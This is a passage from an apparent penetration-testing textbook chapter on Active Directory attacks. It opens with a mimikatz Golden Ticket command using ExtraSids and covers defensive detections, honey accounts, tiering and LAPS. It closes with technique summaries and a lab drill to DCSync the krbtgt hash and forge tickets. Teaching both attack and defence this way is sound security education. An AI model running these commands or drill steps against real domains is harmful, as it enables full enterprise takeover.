# ExtraSids attack with inter-forest trust key
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-CORP-SID /krbtgt:<KRBTGT_HASH> /sids:S-1-5-21-PARTNER-SID-519 /ptt
```

The forest boundary stops SID history injection BY DEFAULT (SID
filtering). But it's frequently misconfigured or disabled for
application compatibility. Check the trust properties.

---

## Defense Perspective — What Blue Team Watches

Understanding the defender's viewpoint makes you a better attacker AND
a better defender. This section is the mirror image.

### Honey Accounts and Deception

**Honey users**: Fake accounts with SPNs (Kerberoast bait). If anyone
requests a ticket for this SPN, it's an attacker. Alert fires immediately.

**Honey credentials**: Fake credentials planted in memory, LSASS, registry.
If used to authenticate — intruder detected.

**Honey shares**: Fake file shares with enticing names ("Finance_Reports",
"CEO_Email_Backup"). Any access attempt = alertable event.

**Canary tokens**: Files/credentials that phone home when accessed.
If the NTDS.dit gets exfiltrated and the canary credential is used
to authenticate anywhere — the defender knows the breach happened and
gets the attacker's IP.

### Detection Events To Monitor

| Attack | Detection Event | Event ID |
|--------|-----------------|----------|
| Kerberoasting | TGS request with RC4 encryption | 4769 (0x17 enc) |
| AS-REP Roasting | AS-REQ without pre-auth for flagged accounts | 4768 |
| Golden Ticket | TGT with abnormal lifetime or non-existent user | 4769, 4768 anomalies |
| DCSync | Directory replication from non-DC IP | 4662 |
| Pass-the-Hash | NTLM logon from unexpected source | 4624 (Type 3, NTLM) |
| DCOM lateral | DCOM connection + remote process creation | 4688 + network events |
| Service creation (psexec) | New service installed | 7045, 4697 |
| GPO modification | GPO changed outside of change window | 5136 (Directory change) |
| ACL modification | DACL changed on sensitive objects | 4662, 5136 |
| Certificate request | Certificate issued for privileged user from unusual source | AD CS audit events |

### Tiered Administration Model

The gold standard for AD defense:
- **Tier 0** — Domain Controllers, AD admins, PKI. Only Tier 0 accounts touch Tier 0 assets.
- **Tier 1** — Servers, applications. Tier 1 accounts only.
- **Tier 2** — Workstations, end-user support. Tier 2 accounts only.

A Domain Admin should NEVER log into a workstation. If they do, their
credentials get cached, and when that workstation gets compromised,
the attacker gets DA creds. Tiered admin prevents this credential
hop.

### Protected Users Group

Members of the Protected Users security group:
- No NTLM authentication (prevents PtH)
- No DES or RC4 in Kerberos (prevents Kerberoasting with weak encryption)
- No credential delegation
- No caching of credentials at logon
- TGT lifetime limited to 4 hours

Add sensitive accounts to Protected Users. It breaks some legacy
applications but dramatically reduces the attack surface.

### LAPS — Local Administrator Password Solution

Randomizes the local admin password on every domain-joined machine.
Without LAPS, the same local admin password is often deployed to every
workstation via image/GPO. Compromise one → compromise all.

With LAPS, each machine has a unique password stored in AD. Even if you
get one machine's local admin hash, it doesn't work on any other machine.

### Why Understanding AD Attacks Makes You Better At Defense

You can't defend what you don't understand. Every attack in this chapter
has a detection signature. Every technique has a defensive control.
When you read a SOC alert about "anomalous TGS request with RC4
encryption" — you know that's a Kerberoasting attempt. When you see
"directory replication from non-DC source" — you know that's DCSync.

The best defenders are people who've run the attacks themselves.
That's you.

---

## Summary — Key Takeaways

- **Active Directory is the crown jewel.** Compromise AD and you own the
  entire enterprise. Every user, every machine, every secret. AD attacks
  are the endgame of enterprise penetration testing.

- **Enumeration comes first.** BloodHound, PowerView, ldapsearch. Map
  every user, group, computer, trust, ACL, and delegation before you
  attack anything. The shortest path to Domain Admin is usually NOT
  the obvious one.

- **Kerberoasting is the lowest-friction attack in AD.** Any authenticated
  user can request service tickets and crack them offline. No special
  privileges needed. Target service accounts with SPNs — they often have
  weak, never-rotated passwords.

- **ACL abuse is massively overlooked.** Misconfigured permissions are
  everywhere. GenericAll on a user means you own that user. WriteDACL
  on a group means you own that group. BloodHound finds these paths
  automatically.

- **The krbtgt hash is the master key.** With it you forge Golden Tickets
  for any user, any time, from anywhere. Valid until krbtgt is rotated
  TWICE. Most organisations never rotate it.

- **Delegation is a designed-in vulnerability.** Unconstrained delegation
  caches TGTs. Constrained delegation can be abused via S4U. RBCD can
  be set by anyone with write access to a computer object. All three are
  exploitable for privilege escalation and lateral movement.

- **AD CS is the newest attack frontier.** Misconfigured certificate
  templates (ESC1-ESC8+) provide escalation paths that survive password
  rotations. Certificates are valid for their entire lifetime regardless
  of credential changes.

- **DCSync is the quietest way to dump the domain.** Impersonate a DC,
  request replication, receive every hash. No file access on the DC.
  No service creation. Just normal replication traffic from an abnormal
  source.

- **Persistence in AD is almost unremovable without a full rebuild.**
  Golden Tickets, SID history, AdminSDHolder, skeleton keys, DSRM
  passwords, rogue certificates. If an attacker gets DA and has time,
  eviction requires rebuilding the forest from scratch.

- **Defence requires understanding offence.** Tiered administration,
  Protected Users, LAPS, honey accounts, Kerberos monitoring — every
  defensive control maps directly to an attack technique in this chapter.

---

## Drill 20 — Active Directory Warfare

Go to `DRILLS/20_ad_warfare/`. A vulnerable AD lab environment is waiting.

Your mission:
1. Enumerate the domain completely with BloodHound and PowerView
2. Find and exploit a Kerberoastable account
3. Identify an ACL abuse path to Domain Admin
4. Perform lateral movement using at least two different methods
5. Execute DCSync and extract the krbtgt hash
6. Forge a Golden Ticket and verify domain-wide access
7. Document every detection artifact your attack generated

Build the attack. Then build the defence.
